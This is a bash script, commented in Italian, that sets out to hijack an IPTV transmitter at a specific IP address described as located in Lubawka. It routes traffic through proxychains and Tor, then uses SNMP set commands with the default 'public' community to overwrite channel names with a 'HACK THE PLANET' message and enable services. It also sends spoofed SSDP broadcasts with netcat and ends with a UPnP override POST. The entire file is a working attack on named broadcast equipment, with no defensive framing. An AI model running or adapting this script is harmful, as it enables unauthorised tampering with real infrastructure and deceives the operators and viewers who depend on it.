#!/bin/bash
# sti410C_hijack.sh - TRUSTEDF57
TARGET="46.174.72.9"
MSG="TRUSTEDF57 HACK THE PLANET"
clear; toilet -f big "HIJACK $TARGET" --gay; sleep 2

echo -e "\e[91m🚀 AVVIO HIJACK IPTV...\e[0m"
echo -e "\e[93m📡 TARGET: $TARGET (Lubawka-NADAJNIK-IPTV)\e[0m"
echo -e "\e[92m💥 MESSAGGIO: $MSG\e[0m"

# PROXY ROTATION HIJACK (tutti canali attivi)
for i in {1..5}; do
  echo -e "\e[95m🔄 Rotazione $i/5...\e[0m"
  
  # SNMP SET Channel 1-5 (PID/Freq attivi da enum)
  proxychains4 snmpset -v1 -c public $TARGET ".1.3.6.1.4.1.30631.1.9.1.1.1.0" s "$MSG" && \
  proxychains4 snmpset -v1 -c public $TARGET ".1.3.6.1.4.1.30631.1.9.1.1.2.0" s "$MSG" && \
  proxychains4 snmpset -v1 -c public $TARGET ".1.3.6.1.4.1.30631.1.9.1.27.1.0" s "$MSG" && \
  
  # Enable services
  torsocks snmpset -v1 -c public $TARGET ".1.3.6.1.4.1.30631.1.9.1.1.1.1" i 1 && \
  torsocks snmpset -v1 -c public $TARGET ".1.3.6.1.4.1.30631.1.9.1.1.2.1" i 1 && \
  
  # SSDP Broadcast ALL
  echo -e "NOTIFY * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nNT:urn:schemas-upnp-org:device:terrabus:1\r\nUSN:uuid:$MSG!!\r\nNTS:ssdp:alive\r\nCACHE-CONTROL:max-age=3600\r\n\r\n" | \
  torsocks nc -u 239.255.255.250 1900 -w2
  
  sleep 3
done

# UPnP Override finale
torsocks curl -s -X POST "http://$TARGET/ipxml_ssdp.cgi" -d "<service><name>$MSG</name><status>1</status></service>"

clear; figlet -f slant "HIJACKED!"; lolcat
echo -e "\e[91m🎥 TUTTI CANALI SOSTITUITI CON: $MSG\e[0m"
echo -e "\e[93m📺 VERIFICA: RTSP://$TARGET:554/stream1 | VLC/FFPLAY\e[0m"
echo -e "\e[92m🌐 WebSDR: sp3pgz.ampr.org:8073 (474-858MHz)\e[0m"
echo -e "\e[95m⚡ SSDP BROADCAST ATTIVO 1h!\e[0m"
